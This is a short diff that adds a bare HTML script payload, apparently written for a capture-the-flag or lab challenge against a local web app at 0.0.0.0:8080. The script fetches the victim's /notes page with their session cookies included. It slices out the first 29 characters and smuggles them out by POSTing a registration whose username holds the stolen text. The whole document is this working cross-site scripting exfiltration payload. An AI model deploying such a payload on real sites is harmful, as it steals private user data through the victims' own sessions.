@@ -1,0 +1,8 @@
+<script>
+fetch('http://0.0.0.0:8080/notes',{credentials:'include'})
+.then(r=>r.text())
+.then(h=>{
+let short=h.substring(0,29);
+fetch('http://0.0.0.0:8080/register',{method:'POST',body:new URLSearchParams({username:'dbg_'+short,password:'x'})});
+});
+</script>
